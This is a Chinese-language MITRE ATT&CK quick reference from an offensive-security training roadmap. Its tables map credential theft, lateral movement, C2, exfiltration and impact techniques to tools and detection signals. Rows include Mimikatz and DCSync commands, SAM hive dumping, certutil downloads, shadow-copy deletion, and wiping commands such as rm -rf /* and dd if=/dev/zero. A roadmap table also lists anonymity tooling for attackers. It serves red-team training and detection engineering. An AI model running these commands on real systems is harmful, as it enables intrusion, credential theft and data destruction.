> **修正说明（对比上一版）：** 栈伪造此前被映射到 T1055（进程注入）。T1055 涵盖的是把代码注入其他进程。栈伪造是通过在栈上构造伪造的返回地址链，来隐藏调用的真实来源；由于它混淆了执行流，使 EDR 基于调用栈的行为检测失效，最合适的映射是 **T1027**（混淆文件或信息）。Hypervisor Rootkit 此前被映射到 T1564（隐藏痕迹）。把自己安置在操作系统之下的虚拟机监控程序 rootkit，其持久化/执行组件最合适的映射是 **T1542.001**（操作系统启动前：系统固件）或 **T1542.003**（引导套件）。T1564 涵盖的是在操作系统内部隐藏痕迹，而不是颠覆操作系统本身。BYOVD 此前只映射到 T1543.003，正确映射是 **T1543.003**（把驱动作为 Windows 服务加载）与 **T1562.001**（用驱动的 IOCTL 终止/禁用 EDR）的组合，需要两个编号才能完整描述该技术。

---

<a id="9-ta0006-credential-access"></a>
## 9. TA0006: 凭据访问

> 从内存、磁盘和认证服务中窃取凭据。阶段 2+ 核心。阶段 4I 的 AD 专项深度。

| 技术 | 子技术 | ID | 工具 / 方法 | 检测信号 |
|---|---|---|---|---|
| 操作系统凭据转储 | LSASS 内存 | T1003.001 | Mimikatz sekurlsa::logonpasswords、procdump lsass、nanodump | Sysmon 10：以 PROCESS_VM_READ 访问 lsass.exe。事件 4656/4663：lsass 句柄 |
| 操作系统凭据转储 | SAM | T1003.002 | reg save HKLM\SAM、secretsdump 提取 SAM | Sysmon 12/13：SAM 配置单元被访问。事件 4661：SAM 对象访问 |
| 操作系统凭据转储 | NTDS | T1003.003 | ntdsutil IFM、vssadmin + 复制 NTDS.dit | 事件 4776：转储后 NTLM 认证激增。VSS：创建了快照 |
| 操作系统凭据转储 | LSA 机密 | T1003.004 | reg save HKLM\SECURITY、secretsdump -secrets | 事件 4661：SECURITY 配置单元被非 SYSTEM 进程访问 |
| 操作系统凭据转储 | DCSync | T1003.006 | impacket-secretsdump -just-dc、Mimikatz lsadump::dcsync | 事件 4662：来自非 DC 账户的 DS-Replication-Get-Changes-All。网络：来自非 DC IP 的 DRS 流量 |
| 窃取或伪造 Kerberos 票据 | 黄金票据 | T1558.001 | Mimikatz kerberos::golden（需要 krbtgt 哈希） | 事件 4768：PAC 或有效期异常的 TGT。SIEM：票据被不存在的账户使用 |
| 窃取或伪造 Kerberos 票据 | 白银票据 | T1558.002 | Mimikatz kerberos::silver（需要服务账户哈希） | 事件 4769：在仅支持 AES 的环境中请求 RC4 服务票据。无对应的 4768 事件 |
| 窃取或伪造 Kerberos 票据 | Kerberoasting | T1558.003 | GetUserSPNs.py、Rubeus kerberoast、impacket | 事件 4769：请求 RC4（0x17）服务票据。频率：单台主机短时间内请求多个 SPN |
| 窃取或伪造 Kerberos 票据 | AS-REP Roasting | T1558.004 | GetNPUsers.py、Rubeus asreproast、kerbrute | 事件 4768：不带预认证标志的 AS-REQ。带 DoNotRequirePreAuth 属性的账户 |
| 窃取或伪造 Kerberos 票据 | 钻石票据 | T1558.001 | Rubeus diamond（请求并修改合法 TGT） | 比黄金票据更难检测：合法的 4768 + 被修改的 PAC。事件 4672：权限集被修改 |
| 窃取或伪造 Kerberos 票据 | Timeroasting | T1558.003 | Timeroast.py（计算机账户 Kerberos 哈希离线破解） | 带计算机账户 SPN 的事件 4769。信号弱：难以与合法请求区分 |
| 窃取或伪造认证证书 | ADCS ESC1 | T1649 | Certipy req -template -upn、允许 SAN 的模板 | 事件 4886：证书被签发。AD CS：带 ENROLLEE_SUPPLIES_SUBJECT 标志的模板 |
| 窃取或伪造认证证书 | ADCS ESC3 | T1649 | 滥用证书请求代理、代他人注册 | AD CS 审计：证书被签发给代理以用于另一账户 |
| 窃取或伪造认证证书 | ADCS ESC4 | T1649 | 修改有漏洞的模板 ACL、添加 ENROLLEE_SUPPLIES_SUBJECT | 事件 4670：证书模板权限被更改 |
| 窃取或伪造认证证书 | ADCS ESC6 | T1649 | CA 上的 EDITF_ATTRIBUTESUBJECTALTNAME2 标志 | AD CS：通过 certutil 审计 CA 标志 |
| 窃取或伪造认证证书 | ADCS ESC8（NTLM 中继） | T1649 | 强制认证 + 中继到 AD CS HTTP 端点（ntlmrelayx） | 网络：NTLM 中继流量。事件 4886：证书被意外签发给被强制认证的机器账户 |
| 窃取或伪造认证证书 | Shadow Credentials | T1649 | Certipy shadow auto、pywhisker：添加 msDS-KeyCredentialLink | 事件 5136：目标对象属性被修改（msDS-KeyCredentialLink） |
| 强制认证 | NTLM 强制认证 | T1187 | PetitPotam、DFSCoerce、PrinterBug、Coercer.py | 网络：来自 DC 到攻击者主机的异常 NTLM 认证。DC 上的事件 4776 |
| 暴力破解 | 密码喷洒 | T1110.003 | kerbrute、spray.py、nxc smb --password | 事件 4625：跨大量账户的多次登录失败。事件 4771：大量 AS-REQ 失败 |
| 暴力破解 | 撞库 | T1110.004 | 泄漏库 + 针对 VPN/OWA/M365 的撞库 | UEBA：不可能旅行、登录地理位置异常。认证日志：失败激增 |
| 暴力破解 | 密码破解 | T1110.002 | hashcat、john：离线破解 NTLM、NTLMv2、Kerberos 哈希 | 无在线检测：全程离线。防御：强制长密码、禁用 RC4 |
| 使用替代认证材料 | 哈希传递 | T1550.002 | nxc、pth-winexe、Mimikatz sekurlsa::pth | 事件 4624 登录类型 3 + NTLM + 异常来源。事件 4648：替代凭据登录 |
| 使用替代认证材料 | 票据传递 | T1550.003 | Mimikatz kerberos::ptt、Rubeus ptt /ticket: | 事件 4769：票据被异常主机使用。klist 显示被注入的票据 |
| 使用替代认证材料 | 应用程序访问令牌 | T1550.001 | Microsoft Teams 令牌重放、OAuth 访问令牌复用 | CASB：钓鱼后令牌从新设备/新地理位置使用 |
| 窃取应用程序访问令牌 | -- | T1528 | Azure PRT 窃取（ROADtools）、GCP WIF 令牌、AWS IMDS IAM 角色、设备码钓鱼结果 | Entra ID：新设备登录、MFA 异常。AWS：CloudTrail GetCallerIdentity 激增 |
| 窃取 Web 会话 Cookie | -- | T1539 | Evilginx3 AiTM 会话 Cookie 捕获、BrowserCookiesView | 浏览器：来自不同 IP 的并行会话。Entra CA：会话令牌的不可能旅行 |
| 伪造 Web 凭据 | SAML 令牌 | T1606.002 | 黄金 SAML（窃取 ADFS SAML 签名证书）、AADInternals | SIEM：无对应登录事件的 SAML 断言。ADFS 事件 1202 |
| 不安全凭据 | 文件中的凭据 | T1552.001 | LaZagne、findstr /si password *.xml *.ini、通过 LDAP 读取 LAPS 属性 | Sysmon 11：访问凭据文件。EDR：短时间内大量读文件 |
| 不安全凭据 | 私钥 | T1552.004 | id_rsa、.pfx、GitHub Actions secret、CI/CD 环境变量 | 文件：访问 .ssh/ 或密钥文件。流水线：secret 被打印进构建日志 |
| 不安全凭据 | 容器 API | T1552.007 | kubectl get secrets、docker inspect（环境变量）、EC2 IMDS 端点 | K8s 审计：枚举 secret。AWS CloudTrail：GetSecretValue |
| 从密码存储中获取凭据 | Web 浏览器 | T1555.003 | LaZagne、SharpChrome、Chrome Login Data 文件 | 文件：访问 Chrome Login Data。Sysmon 10：Chrome 进程被外部进程访问 |
| 从密码存储中获取凭据 | Windows 凭据管理器 | T1555.004 | cmdkey /list、vaultcmd、SharpDPAPI | 事件 4648：访问凭据库。Sysmon：执行 cmdkey.exe |
| 修改认证过程 | -- | T1556 | 修改 Entra ID CA 策略、编辑 ADFS 声明规则、注入万能钥匙 | Entra CA：策略变更告警。ADFS：声明规则修改审计 |

> **修正说明（对比上一版）：** WIF 令牌窃取此前被映射到 T1552.001（文件中的凭据）。T1552.001 涵盖的是存储在磁盘平面文件中的凭据。工作负载身份联合（Workload Identity Federation）令牌是签发给云工作负载的应用层 OAuth/OIDC 令牌，正确映射是 **T1528**（窃取应用程序访问令牌）。当通过 IMDS 端点或容器环境变量读取来窃取凭据时，适用 T1552.007（容器 API）。

---

<a id="10-ta0007-discovery"></a>
## 10. TA0007: 发现

> 取得初始访问后对环境进行测绘。它决定了下一步行动与目标选择。

| 技术 | 子技术 | ID | 工具 / 方法 | 检测信号 |
|---|---|---|---|---|
| 账户发现 | 本地账户 | T1087.001 | net user、Get-LocalUser、id/passwd（Linux） | 事件 4688：带 "user" 参数的 net.exe |
| 账户发现 | 域账户 | T1087.002 | net user /domain、Get-ADUser、ldapdomaindump | DC 上的 LDAP 查询日志：来自工作站的大量查询 |
| 账户发现 | 电子邮件账户 | T1087.003 | Get-Mailbox（Exchange）、AADInternals 用户枚举 | Exchange：异常邮箱枚举。M365 审计：列出用户 |
| 账户发现 | 云账户 | T1087.004 | az ad user list、aws iam list-users、gcloud iam list | 云审计日志：某 IAM 身份的批量用户枚举突发 |
| 域信任发现 | -- | T1482 | nltest /domain_trusts、Get-ADTrust、BloodHound 信任边 | 事件 4688：nltest.exe。LDAP：信任对象查询 |
| 权限组发现 | 本地组 | T1069.001 | net localgroup administrators | 事件 4688：带 "localgroup" 的 net.exe |
| 权限组发现 | 域组 | T1069.002 | net group "Domain Admins" /domain、Get-ADGroupMember | DC 上的 LDAP 查询：组成员枚举 |
| 权限组发现 | 云组 | T1069.003 | az ad group list、aws iam list-groups | 云审计日志：组枚举 |
| 系统信息发现 | -- | T1082 | systeminfo、uname -a、Get-ComputerInfo、wmic os get | 事件 4688：systeminfo.exe。基线：工作站发出异常系统查询 |
| 系统网络配置发现 | -- | T1016 | ipconfig /all、route print、arp -a、ip route | 事件 4688：依次执行 ipconfig.exe、route.exe、arp.exe |
| 远程系统发现 | -- | T1018 | net view、nmap 扫内网段、arp -a、NBT 扫描 | 网络：ICMP 扫描、对多台主机的 SMB 探测 |
| 网络服务发现 | -- | T1046 | nmap -sV、masscan、nxc smb/ldap 扫描 | 网络 IDS：端口扫描特征。防火墙：对关闭端口的连接尝试 |
| 网络共享发现 | -- | T1135 | net share、net view \\host、Get-SmbShare | 事件 4688：net.exe。Sysmon 3：短时间内对多台主机的 SMB 连接 |
| 组策略发现 | -- | T1615 | Get-GPO、gpresult /h、SharpGPO | LDAP：来自工作站的 GPO 查询。事件 4688：gpresult.exe |
| 软件发现 | -- | T1518 | wmic product get、Get-InstalledApplication、dpkg -l | 事件 4688：带 "product get" 的 wmic.exe |
| 文件和目录发现 | -- | T1083 | dir /s、ls -la /etc、find / -name *.config | auditd/Sysmon：短时间内大量文件访问。EDR：进程访问大量文件 |
| 进程发现 | -- | T1057 | tasklist、ps aux、Get-Process | 基线：异常的进程列表操作。事件 4688：非管理工具发起的 tasklist.exe |
| 云服务发现 | -- | T1526 | az resource list、aws ec2 describe-instances | 云审计日志：某 IAM 身份的批量资源枚举突发 |
| 查询注册表 | -- | T1012 | reg query、针对特定键调用 RegQueryValueEx | Sysmon 12/13：异常进程读取敏感键 |

---

<a id="11-ta0008-lateral-movement"></a>
## 11. TA0008: 横向移动

> 从初始立足点移动到其他机器、账户或环境。

| 技术 | 子技术 | ID | 工具 / 方法 | 检测信号 |
|---|---|---|---|---|
| 远程服务 | 远程桌面协议 | T1021.001 | mstsc、xfreerdp、SharpRDP、RDP 会话劫持 | 事件 4624 登录类型 10（远程交互）。事件 4778：会话重连 |
| 远程服务 | SMB/Windows 管理共享 | T1021.002 | nxc smb --exec、psexec、smbexec、PsExec | 事件 4624 登录类型 3 + 5140（ADMIN$/C$ 共享访问）。事件 7045：服务被安装 |
| 远程服务 | DCOM | T1021.003 | SharpCOM、远程 MMC20.Application.ExecuteShellCommand | 事件 4688：DCOM 拉起的 dllhost.exe。事件 4624 来自 DCOM 的登录类型 3 |
| 远程服务 | SSH | T1021.004 | ssh -i stolen_key、sshpass、写 authorized_keys | auth.log/journald：来自新 IP 的 ssh 登录。authorized_keys 新增条目 |
| 远程服务 | WinRM | T1021.006 | evil-winrm、Invoke-Command -ComputerName、Enter-PSSession | 事件 4624 登录类型 3 + WSMan 流量（5985/5986 端口）。事件 4688：wsmprovhost.exe |
| 远程服务 | VNC | T1021.005 | RealVNC、TightVNC 漏洞利用 | 网络：来自横向来源的 VNC 端口（5900）连接 |
| 利用远程服务 | -- | T1210 | EternalBlue（MS17-010）、BlueKeep、ProxyLogon、ProxyShell | IDS：漏洞利用流量特征。事件 4625：利用前的登录失败 |
| 中间人攻击 | LLMNR/NBT-NS 投毒 | T1557.001 | Responder.py、Inveigh：捕获 NTLMv2 哈希 | 网络：来自非权威来源的 LLMNR/NBNS 响应 |
| 中间人攻击 | ARP 缓存投毒 | T1557.002 | arpspoof、bettercap ARP 投毒 | 网络：重复的 ARP 响应。ARP 表：已知网关的 MAC 变化 |
| 中间人攻击 | DHCP 欺骗 | T1557.003 | DHCP 耗尽 + 伪造服务器（yersinia） | 网络：来自异常来源的 DHCP 服务器 |
| 使用替代认证材料 | 哈希传递 | T1550.002 | 同凭据访问一节 | 同上 |
| 使用替代认证材料 | 票据传递 | T1550.003 | 同凭据访问一节 | 同上 |
| 内部鱼叉钓鱼 | -- | T1534 | Microsoft Teams 钓鱼私信、带恶意链接的 Slack 私信 | CASB：Teams 外部链接 + 发给内部用户的文件。UBA：消息量异常 |
| 远程服务会话劫持 | SSH 劫持 | T1563.001 | 继承 SSH agent socket（SSH_AUTH_SOCK）、劫持 ssh-agent | auth.log：在他人 SSH 会话下执行命令 |
| 远程服务会话劫持 | RDP 劫持 | T1563.002 | 用 tscon.exe 劫持断开的 RDP 会话 | 事件 4778：来自异常用户的会话重连。Sysmon：执行 tscon.exe |
| 污染共享内容 | -- | T1080 | 在其他用户会访问的共享盘放置 DLL/LNK | Sysmon 11：网络共享中创建文件。文件完整性：共享监控 |
| 横向工具传输 | -- | T1570 | certutil -urlcache、bitsadmin、Invoke-WebRequest 向远程主机下载 | 网络：内网主机到攻击者 C2 的 HTTP/HTTPS。Sysmon 3：新的出站连接 |

---

<a id="12-ta0009-collection"></a>
## 12. TA0009: 收集

> 在取得访问并完成布势后收集目标数据。

| 技术 | 子技术 | ID | 工具 / 方法 | 检测信号 |
|---|---|---|---|---|
| 本地系统数据 | -- | T1005 | Robocopy /MIR、PowerShell 文件收集脚本 | Sysmon：大量文件读取/打开。EDR：进程访问大量目标类型文件 |
| 网络共享驱动器数据 | -- | T1039 | net use、Invoke-ShareFinder + 复制 | 事件 5140/5145：共享访问。网络：大流量 SMB 读取 |
| 信息存储库数据 | SharePoint | T1213.002 | Microsoft Graph API 下载、PnP PowerShell | M365 审计：从 SharePoint 批量下载 |
| 信息存储库数据 | Confluence | T1213.001 | Confluence REST API 导出、curl | Confluence 审计日志：异常账户导出或批量下载 |
| 电子邮件收集 | 本地电子邮件收集 | T1114.001 | Outlook PST 导出、通过 MAPI 访问 .ost 文件 | Sysmon：非 Outlook 进程访问 PST/OST 文件 |
| 电子邮件收集 | 远程电子邮件收集 | T1114.002 | Microsoft Graph /mail/messages、EWS 导出（MailSniper） | M365：批量邮件下载。Exchange：返回大量结果的 EWS 查询 |
| 电子邮件收集 | 电子邮件转发规则 | T1114.003 | 用 New-InboxRule 把全部邮件转发到外部、OWA 规则 | M365 审计：新建收件箱规则。告警：转发到外部域 |
| 屏幕捕获 | -- | T1113 | GDI+ ScreenCapture、PowerShell System.Drawing、键盘记录器截图 | EDR：异常的 BitBlt/ScreenCapture API 调用 |
| 剪贴板数据 | -- | T1115 | GetClipboardData Win32 API、PowerShell Get-Clipboard | Sysmon 28（剪贴板变更）。EDR：非 UI 进程访问剪贴板 |
| 自动化收集 | -- | T1119 | 收集脚本（7-zip + robocopy 循环）、Meterpreter stdapi | EDR：持续的大流量文件访问。DLP：短时间内压缩大量文件 |
| 归档收集的数据 | 通过工具归档 | T1560.001 | 7z a、zip -r、tar -czf | Sysmon 1：7z.exe 或 tar.exe 输出到异常归档路径 |
| 数据暂存 | 本地数据暂存 | T1074.001 | 外泄前复制到 C:\ProgramData\、C:\Temp\ | Sysmon 11：文件被复制到暂存路径。DLP：敏感文件聚集 |
| 数据暂存 | 远程数据暂存 | T1074.002 | 暂存在此前已攻陷的内网主机上 | 网络：向跳板点的大流量主机间传输 |
| 输入捕获 | 键盘记录 | T1056.001 | SetWindowsHookEx WH_KEYBOARD_LL、基于驱动的键盘记录器 | EDR：非 UI 进程调用带 WH_KEYBOARD_LL 的 SetWindowsHookEx |

---

<a id="13-ta0011-command-and-control"></a>
## 13. TA0011: 命令与控制

> 与植入体保持可靠、隐蔽的通信。阶段 4B 的核心内容。

| 技术 | 子技术 | ID | 工具 / 方法 | 检测信号 |
|---|---|---|---|---|
| 应用层协议 | Web 协议（HTTP/S） | T1071.001 | Sliver HTTP/S 监听器、Cobalt Strike HTTP beacon、自研 C2 | 网络：以固定抖动间隔周期回连的 beacon。TLS：C2 域名使用自签名或 Let's Encrypt 证书 |
| 应用层协议 | DNS | T1071.004 | DNS C2（dnscat2、iodine、自研 TXT/A 记录） | DNS：对长子域名的高频查询且携带数据 |
| 应用层协议 | SMB/命名管道 | T1071 | Cobalt Strike SMB beacon、自研命名管道协议 | Sysmon 17/18：异常名称的命名管道创建/连接 |
| 代理 | 内部代理 | T1090.001 | Ligolo-ng agent、chisel SOCKS5、Meterpreter socks | 网络：内网主机上的 SOCKS5。Sysmon 3：工作站上的监听端口 |
| 代理 | 外部代理 | T1090.002 | VPS 中继、经云服务器走 Proxychains | 网络：C2 流量经云厂商 IP 转发 |
| 代理 | 多跳代理 | T1090.003 | 代理链：VPS1 > VPS2 > 目标、Tor | 网络：Tor 出口节点流量。多跳延迟特征 |
| 代理 | 域前置 | T1090.004 | CDN 前置（Cloudflare、Azure CDN、Fastly）配合 malleable C2 | TLS：SNI 与 Host 头不匹配。CDN：滥用举报 |
| 非应用层协议 | -- | T1095 | ICMP C2（icmpsh、ptunnel）、原始 TCP、自研 UDP | 网络：载荷较大的 ICMP 或回显应答中携带数据 |
| 协议隧道 | -- | T1572 | DNS-over-HTTPS C2、SSH 反向隧道、HTTP CONNECT 隧道 | 网络：大流量 DoH、来自异常端点的 SSH |
| 动态解析 | 域名生成算法 | T1568.002 | 内置 DGA 的恶意软件（基于时间生成域名） | DNS：对多个 NXDOMAIN 响应呈规律特征的查询突发 |
| 动态解析 | 快速通量 | T1568.001 | TTL 极短、轮转到大量 IP 的 DNS 记录 | DNS：TTL 小于 300 秒、单域名 IP 轮转 |
| 加密通道 | 对称加密 | T1573.001 | AES 加密的 C2 通道、TCP 上的 XOR | 网络：无 TLS 握手的加密流量。深度包检测失效 |
| 加密通道 | 非对称加密 | T1573.002 | C2 会话的 RSA 密钥交换、自研 TLS 证书固定 | TLS 检测：固定证书与 CA 签发证书不匹配。JA3/JA3S 指纹 |
| 入口工具传输 | -- | T1105 | certutil -urlcache、Invoke-WebRequest、curl、bitsadmin 传输 | Sysmon 3：LOLBin（certutil、mshta）发起 HTTP GET。Web 代理：从新域名下载 |
| 数据编码 | 标准编码 | T1132.001 | HTTP 正文或 DNS 中的 base64 编码 C2 流量 | 网络：HTTP 正文中的 base64 特征。DNS：主机名中的 base64 |
| 数据编码 | 非标准编码 | T1132.002 | 自定义字母表 base64、XOR 编码的 HTTP 参数 | 网络：非标准编码特征。熵分析 |
| 备用通道 | -- | T1008 | 主 HTTP 通道失效时回落到 DNS C2 | 网络：主 C2 失联后协议突然切换 |
| Web 服务 | 双向通信 | T1102.002 | Slack/Discord/Teams webhook 作 C2、Twitter 私信 C2 | CASB：终端在无浏览器的情况下调用协作平台 API |

---

<a id="14-ta0010-exfiltration"></a>
## 14. TA0010: 数据外泄

> 在不触发 DLP、出站过滤或 SIEM 告警的情况下把数据送出去。

| 技术 | 子技术 | ID | 工具 / 方法 | 检测信号 |
|---|---|---|---|---|
| 通过 C2 通道外泄 | -- | T1041 | 通过现有 C2 HTTP/S 通道上传暂存的归档 | DLP：向已知 C2 的大体积上传。Beacon：来自植入体的异常大响应 |
| 通过替代协议外泄 | 对称加密的非 C2 通道 | T1048.001 | 用 SFTP 传到 VPS、非标准端口上的自研加密 TCP | 防火墙：向 VPS IP 的非标准端口出站。DLP：加密的大体积传输 |
| 通过替代协议外泄 | DNS | T1048.003 | dnscat2 文件传输、TXT 查询中的 base64 | DNS：查询量高、TXT 响应大、子域名很长 |
| 通过 Web 服务外泄 | 云存储 | T1567.002 | aws s3 cp、用 rclone 传到攻击者的 S3/GDrive/Mega.nz | DLP：异常进程向云存储服务上传 |
| 通过 Web 服务外泄 | 代码仓库 | T1567.001 | 向攻击者的 GitHub 仓库 git push | DLP：git.exe 向外部仓库推送。网络：向 github.com 的 HTTPS POST |
| 通过物理介质外泄 | USB | T1052.001 | 复制到 USB、用 Rubber Ducky 外带 | DLP：向可移动介质复制文件。事件 6416：可移动存储设备 |
| 计划传输 | -- | T1029 | 仅在特定时段（凌晨 3 点）传输、低速慢速外泄 | DLP：基线显示正常时段，外泄发生在非工作时段 |
| 数据传输大小限制 | -- | T1030 | 把大归档切成 10 MB 小块、错峰传输 | DLP：向同一目的地多次小体积上传，难以触发体积阈值 |
| 自动化外泄 | 流量复制 | T1020.001 | 把流量镜像到攻击者的采集器、网络分光 | 网络：异常的 SPAN/RSPAN 配置 |

---

<a id="15-ta0040-impact"></a>
## 15. TA0040: 影响

> 最终目标：数据销毁、勒索、瘫痪，或达成战略目的。

| 技术 | 子技术 | ID | 工具 / 方法 | 检测信号 |
|---|---|---|---|---|
| 为影响而加密数据 | -- | T1486 | 勒索软件：批量 AES 加密文件、投放勒索信 | EDR：短时间内大量文件被重命名/加密。蜜罐/诱饵文件被触发 |
| 抑制系统恢复 | -- | T1490 | vssadmin delete shadows /all、bcdedit /set recoveryenabled No | 事件 4688：带 "delete shadows" 的 vssadmin.exe。EDR：bcdedit 关闭恢复 |
| 数据销毁 | -- | T1485 | sdelete、rm -rf /*、擦除 MFT、覆写扇区 | EDR：大量文件被删除。存储：正常 OS 操作之外的扇区级写入 |
| 磁盘擦除 | 磁盘内容擦除 | T1561.001 | dd if=/dev/zero、Eraser、自研覆写工具 | EDR：用户进程进行原始磁盘访问 |
| 磁盘擦除 | 磁盘结构擦除 | T1561.002 | 覆写 MBR/VBR、擦除分区表 | 启动失败。EDR：向磁盘最前几个扇区原始写入 |
| 停止服务 | -- | T1489 | net stop、Stop-Service、对关键服务 kill -9 | 事件 7036：服务意外停止。SIEM：关键服务宕机告警 |
| 篡改 | 内部篡改 | T1491.001 | 替换内网页面、修改 AD 桌面背景 | Web：内网根目录文件被修改。AD：GPO 桌面背景被更改 |
| 网络拒绝服务 | -- | T1498 | 用被攻陷主机发起放大攻击、SYN 洪水 | 网络：终端出站 UDP/ICMP 激增 |
| 系统关机/重启 | -- | T1529 | shutdown /r /f、Restart-Computer、reboot -f（Linux） | 事件 1074：系统关机被发起。工作时间内意外重启 |
| 资源劫持 | -- | T1496 | 部署挖矿程序（XMRig）、滥用 GPU 算力 | CPU/GPU：持续 100% 占用。网络：连接矿池 IP/域名 |

---

<a id="16-roadmap-phase-to-technique-mapping"></a>
## 16. 路线图阶段与技术映射

本节把每个路线图阶段直接对应到该训练阶段最相关的 MITRE 战术与技术编号。

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/MITRE_ATT&CK_Quick_Reference/2._Roadmap_Phase_to_Technique_Mapping.png" alt="Roadmap Phase to Technique Mapping" width="250"/>

</td></tr></table>
</div>

### 阶段级技术速查表

| 阶段 | 核心技术编号 | 关键工具 |
|---|---|---|
| 阶段 -1（作战安全） | T1583.001/3/4、T1584、T1090.003、T1573 | Mullvad VPN、Tor、门罗币、VPS 注册 |
| 阶段 0（基础） | T1595、T1592、T1593、T1589、T1596 | nmap、subfinder、theHarvester、shodan、amass |
| 阶段 1（Web） | T1190、T1566、T1059.001/3/7、T1218.010/11、T1027.010 | Burp Suite、sqlmap、ffuf、gobuster、nuclei |
| 阶段 2（网络+AD） | T1021、T1557.001、T1550.002/3、T1003.001/6、T1558.003/4 | Responder、nxc、Mimikatz、secretsdump、Rubeus |
| 阶段 3（漏洞利用） | T1068、T1055.001/4/12、T1134.001、T1548.002、T1562.001 | HEVD、pwntools、GEF、Metasploit、UACME |
| 阶段 4A（恶意软件） | T1055（全部）、T1620、T1027、T1547.001、T1543.003 | sRDI、Donut、自研 C++ 植入体、pe2shellcode |
| 阶段 4B（C2） | T1071.001/4、T1090.002/4、T1573.001/2、T1572、T1095 | Sliver、Cobalt Strike、dnscat2、Ligolo-ng |
| 阶段 4C（EDR 规避） | T1562.001、T1562.006、T1106、T1027.007、T1027、T1543.003+T1562.001 | SysWhispers3、BYOVD（RTCore64/DBUtil）、Ekko/Foliage |
| 阶段 4D（漏洞研究） | T1587.004、T1203、T1068 | AFL++、GDB、Ghidra、WinDbg、radare2 |
| 阶段 4E（持久化/Rootkit） | T1542.001/3、T1546.003/15、T1547.004/5/6、T1574.001 | LoJax、UEFITool、WMIBackdoor、COM 劫持脚本 |
| 阶段 4F（Web/云） | T1557、T1539、T1528、T1649、T1534、T1213.002、T1114.002 | Evilginx3、Certipy、AADInternals、GraphRunner、MailSniper |
| 阶段 4G（硬件/ICS） | T1200、T1542.001、T1091、ICS T0836/T0855/T0833 | Flipper Zero、Bus Pirate、ChipWhisperer、OpenPLC |
| 阶段 4H（供应链） | T1195.001/2、T1552.004、T1176、T1587.001、T1608 | npm publish、pypi-upload、GitHub Actions OIDC 滥用 |
| 阶段 4I（AD 全深度） | T1558.001/2/3/4、T1649（ESC1-15）、T1187、T1003.006、T1484 | Certipy、Rubeus、BloodHound、Coercer、impacket |
| 阶段 5（GREATEST：0day 与漏洞研究） | T1587.004、T1588.005/6、T1068、T1211、T1542.001 | kAFL/Nyx、Syzkaller、QEMU-KVM、WinDbg（KDNET）、d8/SpiderMonkey、IDA Pro / BinJa |
| 阶段 6（特种作战） | T1200、T1566.004、T1598、T1557、T1584.004、T1001 | Proxmark3 RDV4、Flipper Zero、HackRF One、MicroSIP、Chisel/WireGuard、Lishi 开锁工具 |

---

<a id="17-critical-attack-chain-diagrams"></a>
## 17. 关键攻击链图解

### 17.1 完整 Active Directory 攻陷链

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/MITRE_ATT&CK_Quick_Reference/3._Full_Active_Directory_Compromise_Chain.png" alt="Full Active Directory Compromise Chain" width="550"/>

</td></tr></table>
</div>

### 17.2 AiTM 钓鱼到持久化云访问

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/MITRE_ATT&CK_Quick_Reference/4._AiTM_Phishing_to_Persistent_Cloud_Access.png" alt="AiTM Phishing to Persistent Cloud Access" width="1400"/>

</td></tr></table>
</div>

### 17.3 植入体执行与 EDR 规避链

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/MITRE_ATT&CK_Quick_Reference/5._Implant_Execution_and_EDR_Evasion_Chain.png" alt="Implant Execution and EDR Evasion Chain" width="300"/>

</td></tr></table>
</div>

### 17.4 云横向移动链

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/MITRE_ATT&CK_Quick_Reference/6._Cloud_Lateral_Movement_Chain.png" alt="Cloud Lateral Movement Chain" width="600"/>

</td></tr></table>
</div>

### 17.5 供应链攻击链

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/MITRE_ATT&CK_Quick_Reference/7._Supply_Chain_Attack_Chain.png" alt="Supply Chain Attack Chain" width="1400"/>

</td></tr></table>
</div>

### 17.6 浏览器 JIT 到内核与虚拟机监控程序逃逸链（阶段 5）

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/MITRE_ATT&CK_Quick_Reference/11._Browser_JIT_to_Kernel_and_Hypervisor_Escape_Chain.png" alt="Browser JIT to Kernel and Hypervisor Escape Chain" width="280"/>

</td></tr></table>
</div>

### 17.7 全范围多域物理到云攻击链（阶段 6）

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/MITRE_ATT&CK_Quick_Reference/12._Full_Scope_Multi_Domain_Physical_to_Cloud_Chain.png" alt="Full Scope Multi-Domain Physical-to-Cloud Chain" width="1000"/>

</td></tr></table>
</div>

---

<a id="18-tool-to-technique-mapping"></a>
## 18. 工具与技术映射

快速速查：给定一个具体工具，它体现了哪些 MITRE 技术编号？

| 工具 | 技术编号 | 类别 |
|---|---|---|
| nmap | T1595.001, T1046 | 侦察、发现 |
| masscan | T1595.001, T1046 | 侦察 |
| subfinder / amass | T1590.002, T1593 | 侦察 |
| theHarvester | T1589.002, T1591 | 侦察 |
| Shodan CLI | T1596.005, T1592 | 侦察 |
| truffleHog / gitleaks | T1593.003, T1552.004 | 侦察、凭据访问 |
| Burp Suite | T1190, T1212, T1187 | 初始访问、执行 |
| sqlmap | T1190 | 初始访问 |
| ffuf / gobuster / feroxbuster | T1595.003 | 侦察 |
| nuclei | T1595.002, T1190 | 侦察、初始访问 |
| Evilginx3 | T1566.002, T1539, T1557 | 初始访问、凭据访问 |
| Responder / Inveigh | T1557.001 | 凭据访问（NTLM 捕获） |
| Mimikatz | T1003.001, T1550.002/3, T1558.001/2, T1134 | 凭据访问 |
| impacket-secretsdump | T1003.001/2/6, T1550.002 | 凭据访问 |
| Rubeus | T1558.001/2/3/4, T1550.003 | 凭据访问 |
| Certipy | T1649（ESC1-15）、T1649（Shadow Creds） | 凭据访问（ADCS） |
| BloodHound + SharpHound | T1087.002, T1482, T1069.002 | 发现 |
| ldapdomaindump | T1087.002, T1069.002 | 发现 |
| PingCastle | T1082, T1087.002, T1482 | 发现 |
| nxc (NetExec) | T1021.002, T1550.002, T1135, T1110.003 | 多个 |
| evil-winrm | T1021.006 | 横向移动 |
| psexec (Sysinternals) | T1021.002, T1569.002 | 横向移动 |
| Ligolo-ng | T1090.001, T1572 | C2、代理 |
| Sliver | T1071.001/4, T1090.002/4, T1573 | C2 |
| dnscat2 | T1071.004, T1048.003 | C2、数据外泄 |
| Donut | T1027.009, T1620 | 防御规避 |
| sRDI | T1620, T1055.001 | 防御规避 |
| SysWhispers3 | T1106, T1027.007 | 防御规避 |
